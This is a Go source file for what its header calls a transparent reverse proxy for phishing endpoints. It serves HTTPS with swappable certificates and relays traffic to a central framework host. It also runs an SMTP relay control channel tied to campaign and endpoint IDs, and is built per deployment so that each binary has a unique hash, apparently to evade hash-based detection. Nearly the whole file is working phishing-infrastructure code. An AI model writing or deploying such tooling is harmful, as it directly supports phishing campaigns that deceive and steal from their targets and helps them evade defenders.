// Package main implements a transparent reverse proxy for phishing endpoints.
//
// This binary is compiled per-deployment with unique build-time variables
// that ensure each proxy binary has a distinct SHA-256 hash.
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Run starts the transparent reverse proxy servers (HTTPS + HTTP redirect).
// It uses the certManager for dynamic TLS certificate loading.
func (p *transparentProxy) Run(httpsAddr, httpAddr string, cm *certManager) error {
	log.Printf("starting transparent reverse proxy, upstream=%s", p.upstreamAddr)

	tlsConfig := buildTLSConfig(cm)

	httpsServer := &http.Server{
		Addr:         httpsAddr,
		Handler:      p,
		TLSConfig:    tlsConfig,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 0,
		IdleTimeout:  120 * time.Second,
	}

	httpServer := &http.Server{
		Addr: httpAddr,
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			target := "https://" + r.Host + r.URL.RequestURI()
			http.Redirect(w, r, target, http.StatusMovedPermanently)
		}),
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 5 * time.Second,
	}

	errCh := make(chan error, 2)

	go func() {
		log.Printf("listening HTTPS on %s", httpsAddr)
		if err := httpsServer.ListenAndServeTLS("", ""); err != http.ErrServerClosed {
			errCh <- fmt.Errorf("HTTPS server: %w", err)
		}
	}()

	go func() {
		log.Printf("listening HTTP on %s (redirect to HTTPS)", httpAddr)
		if err := httpServer.ListenAndServe(); err != http.ErrServerClosed {
			errCh <- fmt.Errorf("HTTP server: %w", err)
		}
	}()

	select {
	case <-p.shutdownCh:
	case err := <-errCh:
		return err
	}

	log.Printf("initiating graceful shutdown...")

	shutdownCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	_ = httpsServer.Shutdown(shutdownCtx)
	_ = httpServer.Shutdown(shutdownCtx)

	done := make(chan struct{})
	go func() {
		p.activeConnections.Wait()
		close(done)
	}()

	select {
	case <-done:
		log.Printf("all connections drained")
	case <-shutdownCtx.Done():
		log.Printf("shutdown timeout, forcing close")
	}

	return nil
}

func main() {
	bi := BuildInfoAtRuntime()
	fingerprint := ComputeBinaryFingerprint()

	log.Printf("proxy starting: campaign=%s endpoint=%s fingerprint=%s",
		bi.CampaignID, bi.EndpointID, fingerprint)

	// Initialize certificate manager with self-signed cert.
	// The framework can push operator-provided or ACME certs via the control channel.
	cm, err := newCertManager(bi.LandingPagePort) // domain will be empty until set
	if err != nil {
		log.Fatalf("cert manager: %v", err)
	}

	proxy := newTransparentProxy(frameworkHost, landingPagePort)

	// Start control channel (SMTP relay + cert updates).
	relay := newSMTPRelay(bi.EndpointID, frameworkHost, authToken, controlPort)
	relay.certMgr = cm
	if err := relay.Start(); err != nil {
		log.Fatalf("relay start error: %v", err)
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		sig := <-sigCh
		log.Printf("received signal %s, shutting down", sig)
		proxy.Shutdown()
		relay.Stop()
	}()

	if err := proxy.Run(":443", ":80", cm); err != nil {
		log.Fatalf("proxy error: %v", err)
	}

	relay.Stop()
	log.Printf("proxy shutdown complete")
}

func init() {
	vars := []struct {
		name  string
		value string
	}{
		{"campaignID", campaignID},
		{"endpointID", endpointID},
		{"deployTimestamp", deployTimestamp},
		{"buildNonce", buildNonce},
		{"frameworkHost", frameworkHost},
		{"landingPagePort", landingPagePort},
		{"controlPort", controlPort},
		{"authToken", authToken},
	}

	for _, v := range vars {
		if v.value == "" {
			log.Printf("note: %s is empty (will be set at build time)\n", v.name)
		}
	}

	buildHash := sha256.New()
	for _, v := range vars {
		buildHash.Write([]byte(v.value))
	}
	buildHashStr := hex.EncodeToString(buildHash.Sum(nil))[:12]
	log.Printf("build hash: %s", buildHashStr)
}
